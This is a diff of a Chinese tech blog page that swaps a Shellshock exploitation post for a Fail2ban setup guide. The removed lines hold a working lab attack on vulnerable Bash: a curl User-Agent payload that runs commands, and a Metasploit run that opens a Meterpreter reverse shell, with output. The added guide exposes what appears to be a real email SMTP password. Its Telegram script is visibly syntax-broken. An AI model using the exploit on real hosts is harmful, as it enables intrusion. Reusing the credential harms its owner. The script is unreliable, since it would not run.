@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Shellshock | Mr.Frame</title>
+  <title>Fail2ban | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="Shellshock | Mr.Frame">
+  <meta name="description" content="Fail2ban | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="function doDecrypt (pwd, onError) { 	console.log(&#39;in doDecrypt&#39;); 	const txt &#x3D; document.getElementById(&#39;enc_content&#39;).innerHTML; 	let plantext; 	try { 		const bytes &#x3D; CryptoJS.AES.decrypt(txt, pwd);">
 <meta property="og:type" content="website">
@@ -1151,9 +1151,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Shellshock" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Fail2ban" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Shellshock</h1>
+        <h1 class="article-title">Fail2ban</h1>
     
     <div class="article-meta">
         
@@ -1163,9 +1163,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -1173,12 +1171,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-08 15:54:41'>2021-01-08 15:54</time>
+            Created At : <time class="date" title='Updated At: 2022-05-24 13:16:52'>2022-05-24 13:16</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:905</span>
+        <span>Count:2.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1208,7 +1206,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%A3%80%E6%B5%8B"><span class="toc-text">本地检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A3%80%E6%B5%8B"><span class="toc-text">远程检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B"><span class="toc-text">curl命令检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%88%A9%E7%94%A8"><span class="toc-text">msf利用</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fail2ban"><span class="toc-text">Fail2ban</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fail2ban%E5%AE%89%E8%A3%85-%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF"><span class="toc-text">fail2ban安装&#x2F;开机自启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-etc-fail2ban"><span class="toc-text">配置文件 &#x2F;etc&#x2F;fail2ban&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-text">配置过滤规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEJail%E8%A7%84%E5%88%99"><span class="toc-text">配置Jail规则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">创建自定义配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5"><span class="toc-text">邮件通知</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEFail2ban-telegram-%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%80%9A%E7%9F%A5"><span class="toc-text">配置Fail2ban telegram 机器人通知</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BF%80%E6%B4%BBfail2ban"><span class="toc-text">激活fail2ban</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E7%94%9F%E6%95%88%E8%84%9A%E6%9C%AC"><span class="toc-text">检测生效脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%90%AF%E5%8A%A8%E7%8A%B6%E6%80%81"><span class="toc-text">检查启动状态</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%8C%87%E5%AE%9A-Jail-%E8%A7%84%E5%88%99%E4%B8%8B%E8%A2%AB%E5%B0%81%E7%A6%81%E7%9A%84IP%E6%83%85%E5%86%B5"><span class="toc-text">查看指定 Jail 规则下被封禁的IP情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%81%E7%A6%81-%E8%A7%A3%E5%B0%81%E9%99%90%E5%88%B6IP"><span class="toc-text">封禁&#x2F;解封限制IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0-%E8%A7%A3%E9%99%A4%E6%8C%87%E5%AE%9AIP%E7%9A%84%E5%BF%BD%E7%95%A5"><span class="toc-text">添加&#x2F;解除指定IP的忽略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99"><span class="toc-text">验证自定义规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bfail2ban%E7%9A%84%E6%97%A5%E5%BF%97"><span class="toc-text">查看fail2ban的日志</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1228,103 +1226,268 @@
 <ul>
 <li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，</p>
-<p>攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。</p>
-<p>此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。</p>
-<ul>
-<li>漏洞条件<br>bash &lt; 4.3</li>
+<h1 id="Fail2ban"><a href="#Fail2ban" class="headerlink" title="Fail2ban"></a>Fail2ban</h1><p>Fail2Ban 是入侵检测软件框架，保护计算机免受暴力破解（brute-force attack）。以 Python 语言编写，能运行于具有包（packet）控制或防火墙的 POSIX 系统，如 iptables 或 TCP Wrapper.</p>
+<p>Fail2Ban可以通过描日志文件并用正则匹配分析，然后通过更新防火墙规则来禁止某些有恶意迹象的 IP（密码失败过多，寻求漏洞利用等）来提高服务器安全性。</p>
+<h2 id="fail2ban安装-开机自启"><a href="#fail2ban安装-开机自启" class="headerlink" title="fail2ban安装/开机自启"></a>fail2ban安装/开机自启</h2><pre><code class="shell">apt install fail2ban
+yum install fail2ban
+systemctl restart fail2ban
+systemctl enable fail2ban.service # 开机自启</code></pre>
+<h2 id="配置文件-etc-fail2ban"><a href="#配置文件-etc-fail2ban" class="headerlink" title="配置文件 /etc/fail2ban/"></a>配置文件 <code>/etc/fail2ban/</code></h2><ul>
+<li>  <code>/etc/fail2ban/filter.d/</code>：条件文件夹, 内含默认文件，用于定义日志文件内容的过滤规则,其中预设于了 SSH、Nginx、Apache 的监控规则</li>
+<li>  <code>/etc/fail2ban/action.d/</code>：动作文件夹, 发现恶意 IP 后采取的操作，其中预设了许多常用操作，其中预设了 iptables、firewalld、sendmail 等操作</li>
+<li>  <code>/etc/fail2ban/jail.d</code>：配置文件夹, Jail 由 Filter 和 Action 组成，用于定义错误次数、封禁时长、封禁动作等</li>
+<li>  <code>/etc/fail2ban/jail.conf</code> ：定义 fai2ban 自身的日志级别、日志位置等</li>
 </ul>
-<h2 id="本地检测"><a href="#本地检测" class="headerlink" title="本地检测"></a>本地检测</h2><pre><code class="zsh">env x=&#39;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre>
-<h2 id="远程检测"><a href="#远程检测" class="headerlink" title="远程检测"></a>远程检测</h2><p>victim.cig内容</p>
-<pre><code class="zsh">#!/usr/local/bash-4.3.0/bin/bash
-echo &quot;Content-type: text/html&quot;
-echo &quot;&quot;
-echo &#39;&lt;html&gt;&#39;
-echo &#39;&lt;head&gt;&#39;
-echo &#39;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#39;
-echo &#39;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#39;
-echo &#39;&lt;/head&gt;&#39;
-echo &#39;&lt;body&gt;&#39;
-echo &#39;&lt;p&gt;&#39;
-echo &#39;Hello world&#39;
-echo &#39;&lt;/p&gt;&#39;
-echo &#39;&lt;/body&gt;&#39;
-echo &#39;&lt;/html&gt;&#39;
-exit 0</code></pre>
-<h3 id="curl命令检测"><a href="#curl命令检测" class="headerlink" title="curl命令检测"></a>curl命令检测</h3><pre><code class="zsh">curl -X GET &quot;http://192.168.108.223:8080/victim.cgi&quot; -H &#39;User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id&#39;
+<p>当 filter 文件监视到的错误记录条数在 jail 中定义的时间内达到 jail 中定义的次数后，告知系统 iptables 执行封禁动作及封禁时长。在封禁时长到期时，告知 iptables 解除封禁。</p>
+<h3 id="配置过滤规则"><a href="#配置过滤规则" class="headerlink" title="配置过滤规则"></a>配置过滤规则</h3><ul>
+<li><code>/etc/fail2ban/filter.d/&lt;fiter-name&gt;.local</code></li>
+</ul>
+<p>首先设置过滤规则，在 <code>/etc/fail2ban/filter.d/</code> 目前下新建一个 <code>.conf</code> 文件，名字自取，比如我新建的是 <code>nginx-zatp-com.conf</code>，然后进行设置：</p>
+<pre><code class="conf">[Definition]
+failregex = 
+ignoreregex =</code></pre>
+<p>其中：</p>
+<p><strong>failregex</strong>：表示过滤规则的正则表达式；<br><strong>ignoreregex</strong>：表示忽略规则的正则表达式，可以设置为 <code>.*(webp|svg|jpg|png)</code> 忽略对图片文件的请求，防止图片文件过多误伤；</p>
+<p>而这里要实现我们想要的效果，也有两个选择，配合开篇提到的 Nginx 流控产生的日志文件（error.log）进行匹配过滤或者直接对 Nginx 的访问日志文件（access.log）进行匹配过滤。原理都一样，fail2ban 预置了很多常见服务的日志文件匹配模板，在 <code>/etc/fail2ban/filter.d/</code> 目录下可以找到。如果你修改了日志格式，那么需要<strong>根据你的日志文件格式改写相应的表达式</strong>。</p>
+<p>这里我用 Nginx 的 <code>limit_req_zone</code> 流控模块做一个示例，下面是一条超过限制产生的错误信息：</p>
+<pre><code>2021/10/13 01:02:39 [error] 14174#0: *41792 limiting requests, excess: 5.920 by zone &quot;request&quot;, client: x.x.x.x, server: www.zatp.com, request: &quot;HEAD /?feed=rss HTTP/2.0&quot;, host: &quot;www.zatp.com&quot;</code></pre>
+<p>参考自带的 <code>/etc/fail2ban/filter.d/nginx-limit-req.conf</code> 模板，可以写成下面的表达式：</p>
+<pre><code>[Definition]
+failregex = ^\s*\[[a-z]+\] \d+#\d+: \*\d+ limiting requests, excess: [\d\.]+ by zone &quot;.*&quot;, client: &lt;HOST&gt;,
+ignoreregex = </code></pre>
+<p><code>failregex</code> 也可以直接简写为：</p>
+<pre><code>failregex = limiting requests, excess:.* by zone.*client: &lt;HOST&gt;</code></pre>
+<p>其中 <code>&lt;HOST&gt;</code> 是必须包含的，fail2ban 通过这个来获取 IP 地址，测试自定义的规则是否生效：</p>
+<pre><code>fail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-zatp-com.conf</code></pre>
+<p>如果成功匹配会返回匹配到的信息：</p>
+<pre><code>Results
+=======
 
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
-<h3 id="msf利用"><a href="#msf利用" class="headerlink" title="msf利用"></a>msf利用</h3><pre><code class="zsh">search shellshock
+Failregex: 4 total
+|-  #) [# of hits] regular expression
+|   1) [4] ^\s*\[[a-z]+\] \d+#\d+: \*\d+ limiting requests, excess: [\d\.]+ by zone &quot;.*&quot;, client: &lt;HOST&gt;,
+`-
 
-Matching Modules
-================
+Ignoreregex: 0 total</code></pre>
+<h3 id="配置Jail规则"><a href="#配置Jail规则" class="headerlink" title="配置Jail规则"></a>配置Jail规则</h3><p>Fail2ban在安装时会创建两个默认的配置文件:</p>
+<ul>
+<li><code>/etc/fail2ban/jail.d/defaults-debian.conf</code></li>
+<li><code>/etc/fail2ban/jail.conf</code><br>我们不建议直接修改这些文件，因为更新Fail2ban时它们可能会被覆盖。</li>
+</ul>
+<p>Fail2ban将按以下顺序读取配置文件。每个<code>.local</code>文件都会覆盖<code>.conf</code>文件中的设置：</p>
+<ul>
+<li>  <code>/etc/fail2ban/jail.conf</code></li>
+<li>  <code>/etc/fail2ban/jail.d/*.conf</code></li>
+<li>  <code>/etc/fail2ban/jail.local</code></li>
+<li>  <code>/etc/fail2ban/jail.d/*.local</code></li>
+</ul>
+<h4 id="创建自定义配置文件"><a href="#创建自定义配置文件" class="headerlink" title="创建自定义配置文件"></a>创建自定义配置文件</h4><pre><code class="shell">cp /etc/fail2ban/jail.&#123;conf,local&#125;
 
-   #   Name                                               Disclosure Date  Rank       Check  Description
-   -   ----                                               ---------------  ----       -----  -----------
-   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
-   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
-   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
-   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
-   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
-   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
-   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
-   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
-   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
-   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
-   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
-   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
+ignoreip = 127.0.0.1/8 ::1 123.123.123.123 192.168.1.0/24</code></pre>
+<ul>
+<li><code>[jail_name]</code> : jail的名称</li>
+<li><code>enabled</code> : 可以设置为<strong>true</strong>或<strong>false</strong>以启用/禁用过滤器</li>
+<li><code>port</code> : 运行服务的端口，如果使用的端口是默认端口，则可以使用服务名称，否则需要明确指定端口号</li>
+<li><code>filter</code> : 位于<code>/etc/fail2ban/filter.d/</code>目录中的过滤器文件的名称(需要与自定义规则里的名称一致，不需要.conf后缀)，其中包含用于解析日志的fileregex信息</li>
+<li><code>logpath</code>: fail2ban检测的日志文件路径</li>
+<li><code>backend</code> : 用于获取日志文件修改的后端 <code>auto</code></li>
+<li><code>ignoreip</code> : 设置白名单ip地址,以空格分隔多个ip/ip段</li>
+<li><code>banaction</code> : 实时锁定行动的类型</li>
+<li><code>action</code> : <code>iptables-allports</code> 如果被触发，执行怎样的脚本？</li>
+<li><code>banaction_allports</code> : Fail2ban阻止每个端口上的远程IP地址</li>
+<li><code>bantime</code> : 锁定时长,默认单位为秒, 默认10m ，值-1将永久禁止IP地址</li>
+<li><code>maxretry</code> : 允许IP失败尝试次数。 默认值设置为5，</li>
+<li><code>findtime</code> : 重试次数之前的持续时间</li>
+</ul>
+<pre><code class="shell">findtime=10m
+maxretry=3
+bantime=1d</code></pre>
+<p>表示 <code>findtime(10m)</code>中内失败次数达到<code>maxretry(3)</code>次则锁定<code>bantime(1d)</code></p>
+<h3 id="邮件通知"><a href="#邮件通知" class="headerlink" title="邮件通知"></a>邮件通知</h3><pre><code class="bash">apt install -y  bsd-mailx sendmail
+systemctl restart sendmail.service
+cat &lt;&lt;EOF &gt;&gt; /etc/mail.rc
+set bsdcompat
+set from= 741474596@qq.com
+set smtp=smtp.qq.com:465      
+set smtp-auth-user=741474596@qq.com
+set smtp-auth-password=gkotyjhergynbdjh     
+set smtp-auth=login 
+#启用ssl加密
+set smtp-user-starttls                                          
+set ssl-verify=ignore
+#ssl的加密证书
+set nss-config-dir=/etc/ssl/certs 
+EOF
 
+# 测试发送邮件
+echo &quot;邮件内容&quot; |mail -v -s &quot;邮件标题&quot; xxx@xxx.com
+mail -s &quot;theme&quot; xx@xxx.com &lt; message.txt
 
-Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/qmail_bash_env_exec
+</code></pre>
+<p>Fail2ban可以在IP被禁止时发送电子邮件警报。 要接收电子邮件，您需要在服务器上安装SMTP并更改默认的action，该action操作仅将IP禁止为<code>%(action_mw)s</code>，如下所示：</p>
+<pre><code># /etc/fail2ban/jail.local
 
+action = %(action_mw)s</code></pre>
+<p><code>%(action_mw)s</code>将禁止有问题的IP，并发送包含Whois报告的电子邮件。 如果要在电子邮件中包含相关日志，请将操作设置为<code>%(action_mwl)s</code>。您还可以调整发送和接收电子邮件地址：</p>
+<pre><code># /etc/fail2ban/jail.local
 
-msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; options
+destemail = admin@myfreax.com
+sender = root@myfreax.com</code></pre>
+<h3 id="配置Fail2ban-telegram-机器人通知"><a href="#配置Fail2ban-telegram-机器人通知" class="headerlink" title="配置Fail2ban telegram 机器人通知"></a>配置Fail2ban telegram 机器人通知</h3><pre><code class="bash">#创建Telegram 机器人为关注`Botfather`，按提示操作即可，
+#可查找机器人Token，添加`userinfobot`查找自己聊天ID
+#在/etc/fail2ban/action.d/中新建telegram.conf文件并写入
+[Definition]
+actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start
+actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop
+actioncheck =
+actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -b &lt;ip&gt;
+actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -u &lt;ip&gt;
+[Init]
+init = 123```
 
-Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+```bash
+#在/etc/fail2ban/中新建scripts目录，并新增send_telegram_notif.sh脚本文件写入
+#!/bin/bash
+# Version 1.0
+# Send Fail2ban notifications using a Telegram Bot
+# Add to the /etc/fail2ban/jail.conf:
+# [sshd]
+# ***
+# action  = iptables[name=SSH, port=22, protocol=tcp]
+#                       telegram
+# Create a new file in /etc/fail2ban/action.d with the following information:
+# [Definition]
+# actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start
+# actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop
+# actioncheck =
+# actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -b &lt;ip&gt;
+# actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n &lt;name&gt; -u &lt;ip&gt;
+#
+# [Init]
+# init = 123
+# Telegram BOT Token
+telegramBotToken=&#39;xxxxx&#39; 
+#此处替换为自己Telegram 机器人Token
+# Telegram Chat ID
+telegramChatID=&#39;xxxxx&#39;#此处替换为自己的Chat ID
+function talkToBot() &#123;
+        message=$1
+        curl -s -X POST https://api.telegram.org/bot$&#123;telegramBotToken&#125;/
+sendMessage -d text=&quot;$&#123;message&#125;&quot;-d chat_id=$&#123;telegramChatID&#125; &gt; /dev/null 2&gt;&amp;1
+&#125;
+if[ $# -eq 0 ]; then
+        echo &quot;Usage $0 -a ( start || stop ) || -b $IP || -u $IP&quot;
+        exit 1;
+fi
+while getopts &quot;a:n:b:u:&quot; opt; do
+case&quot;$opt&quot;in
+                a)
+                        action=$OPTARG
+;;
+                n)
+                        jail_name=$OPTARG
+;;
+                b)
+                        ban=y
+                        ip_add_ban=$OPTARG
+;;
+                u)
+                        unban=y
+                        ip_add_unban=$OPTARG
+;;
+                ?)
+                        echo &quot;Invalid option. -$OPTARG&quot;
+                        exit 1
+;;
+esac
+done
+if[[ ! -z $&#123;action&#125; ]]; then
+case&quot;$&#123;action&#125;&quot;in
+                start)
+                        talkToBot &quot;Fail2ban has been started on `hostname`.&quot;
+;;
+                stop)
+                        talkToBot &quot;Fail2ban has been stopped on `hostname`.&quot;
+;;
+*)
+                        echo &quot;Incorrect option&quot;
+                        exit 1;
+;;
+esac
+elif[[ $&#123;ban&#125; == &quot;y&quot;]]; then
+        talkToBot &quot;[$&#123;jail_name&#125;] The IP: $&#123;ip_add_ban&#125; has been banned on `hostname`.&quot;
+        exit 0;
+elif[[ $&#123;unban&#125; == &quot;y&quot;]]; then
+        talkToBot &quot;[$&#123;jail_name&#125;] The IP: $&#123;ip_add_unban&#125; has been unbanned on `hostname`.&quot;
+        exit 0;
+else
+        info
+fi</code></pre>
+<pre><code class="bash">#给send_telegram_notif.sh脚本添加可执行权限
+chmod +x send_telegram_notif.sh
+#修改jail.local配置文件，将启用的jail的action下添加一个telegram，如下
+action  = iptables[name=SSH,port=2202,protocol=tcp]
+            telegram
+#重启fail2ban验证
+systemctl restart fail2ban</code></pre>
+<p>Telegram 机器人告警通知效果如图<br><img src="https://devops.chat/wp-content/uploads/2021/09/88d658795fad1c4_1_post.png"></p>
+<h2 id="激活fail2ban"><a href="#激活fail2ban" class="headerlink" title="激活fail2ban"></a>激活fail2ban</h2><pre><code class="shell">systemctl restart fail2ban
+service fail2ban restart
+</code></pre>
+<h2 id="检测生效脚本"><a href="#检测生效脚本" class="headerlink" title="检测生效脚本"></a>检测生效脚本</h2><pre><code class="shell">#!/bin/bash
+for ((i=1;i&lt;=50;i++)); do
+curl -H &quot;Fail2ban test&quot; https://your-domian/test &gt; /dev/null 2&gt;&amp;1
+done
+echo &quot;done&quot;```
 
-   Name            Current Setting  Required  Description
-   ----            ---------------  --------  -----------
-   CMD_MAX_LENGTH  2048             yes       CMD max line length
-   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
-   HEADER          User-Agent       yes       HTTP header to use
-   METHOD          GET              yes       HTTP method to use
-   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS          192.168.108.223  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
-   RPORT           8080             yes       The target port (TCP)
-   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT         8080             yes       The local port to listen on.
-   SSL             false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI       victim.cgi       yes       Path to CGI script
-   TIMEOUT         5                yes       HTTP read response timeout (seconds)
-   URIPATH                          no        The URI to use for this exploit (default is random)
-   VHOST                            no        HTTP server virtual host
+# 使用Fail2ban客户端
+`fail2ban-client &lt;COMMAND&gt;`
+以下是 Fail2ban-client 命令列表：
+-   `start`: 用于启动fail2ban服务器和jails
+-   `reload`: 用于重新加载 Fail2ban 配置
+-   `stop`: 停止服务器
+-   `status`: 用于检查服务器状态并启用 jails
+-   `status JAIL` : 显示监狱的状态和当前被禁止的 IP
 
+## 查看所有命令
+```shell
+fail2ban-client -help</code></pre>
+<h2 id="检查启动状态"><a href="#检查启动状态" class="headerlink" title="检查启动状态"></a>检查启动状态</h2><pre><code class="shell">fail2ban-client ping   # 正确启动的话fail2ban会以pong作为回应(Server replied: pong)
+sudo fail2ban-client version #查看 Fai2ban 的版本
+sudo fail2ban-client ping #检查 Fail2ban 是否正常运行（正常将显示 pong）
+sudo systemctl start fail2ban #启动 Fail2ban
+sudo systemctl stop fail2ban #停止 Fail2ban
+sudo systemctl restart fail2ban #重启 Fail2ban
+sudo tail -f /var/log/fail2ban.log #打开 Fail2ban 的日志监控
 
-Payload options (linux/x86/meterpreter/reverse_tcp):
+sudo iptables --list -n #显示系统当前 iptables
+sudo iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP #解除封禁的 IP</code></pre>
+<h2 id="查看指定-Jail-规则下被封禁的IP情况"><a href="#查看指定-Jail-规则下被封禁的IP情况" class="headerlink" title="查看指定 Jail 规则下被封禁的IP情况"></a>查看指定 Jail 规则下被封禁的IP情况</h2><pre><code class="shell">fail2ban-client status [jailname]</code></pre>
+<h2 id="封禁-解封限制IP"><a href="#封禁-解封限制IP" class="headerlink" title="封禁/解封限制IP"></a>封禁/解封限制IP</h2><p><code>sudo fail2ban-client set &lt;jailname&gt; banip/unbanip &lt;IP&gt;</code></p>
+<pre><code class="shell">sudo fail2ban-client set sshd banip 23.34.45.56
+sudo fail2ban-client set sshd unbanip 23.34.45.56</code></pre>
+<h2 id="添加-解除指定IP的忽略"><a href="#添加-解除指定IP的忽略" class="headerlink" title="添加/解除指定IP的忽略"></a>添加/解除指定IP的忽略</h2><pre><code class="shell">fail2ban-client set &lt;JAIL&gt; addignoreip/delignoreip &lt;IP&gt;</code></pre>
+<h2 id="验证自定义规则"><a href="#验证自定义规则" class="headerlink" title="验证自定义规则"></a>验证自定义规则</h2><pre><code class="bash">fail2ban-regex [OPTIONS] &lt;LOG&gt; &lt;REGEX&gt; [IGNOREREGEX]</code></pre>
+<ul>
+<li><code>LOG</code>为需要匹配的日志文件路径，</li>
+<li><code>REGEX</code>为正则表达式所在的文件路径(通常位于<code>filter.d</code>文件夹内)</li>
+</ul>
+<p>以下为常用的<code>OPTIONS</code></p>
+<pre><code class="bash">// Do not print any missed lines
+--print-no-missed
 
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.108.223  yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+// Do not print any ignored lines
+--print-no-ignored
 
+// Print all matched lines
+--print-all-matched
 
-Exploit target:
+// Print all missed lines, no matter how many
+--print-all-missed
 
-   Id  Name
-   --  ----
-   0   Linux x86
-
-
-msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; run
-
-[*] Started reverse TCP handler on 192.168.108.223:4444
-[*] Command Stager progress - 100.46% done (1097/1092 bytes)
-[*] Sending stage (976712 bytes) to 192.168.108.223
-[*] Meterpreter session 4 opened (192.168.108.223:4444 -&gt; 192.168.108.223:53118) at 2021-01-08 16:22:26 +0800
-
-meterpreter &gt;</code></pre>
+// Print all ignored lines, no matter how many
+--print-all-ignored</code></pre>
+<h2 id="查看fail2ban的日志"><a href="#查看fail2ban的日志" class="headerlink" title="查看fail2ban的日志"></a>查看fail2ban的日志</h2><pre><code class="shell">tail -f /var/log/fail2ban.log</code></pre>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
